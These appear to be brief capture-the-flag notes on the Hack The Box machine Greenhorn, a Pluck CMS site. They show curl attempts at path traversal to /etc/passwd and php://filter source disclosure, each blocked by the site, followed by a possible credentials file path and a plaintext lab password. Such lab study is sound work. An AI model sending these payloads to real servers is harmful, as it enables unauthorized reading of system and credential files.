## Greenhorn htb


url:

http://greenhorn.htb/?file=index.php


no wrapers
admin | powered by pluck
❯ curl -s -X GET "http://greenhorn.htb/?file=../../../../../../etc/passwd" | html2text
A hacking attempt has been detected. For security reasons, we're blocking any
code execution.
❯ curl -s -X GET "http://greenhorn.htb/?file=php://filter/convert.base64-encode/resource=index.php" | html2text
A hacking attempt has been detected. For security reasons, we're blocking any
code execution.
❯ curl -s -X GET "http://greenhorn.htb/?file=php://filter/convert.base64-encode/resource=index.php" | html2text
A hacking attempt has been detected. For security reasons, we're blocking any
code execution.



possible credentials:
content/gitlab/greenhorn/data/settings/pass.php
iloveyou1
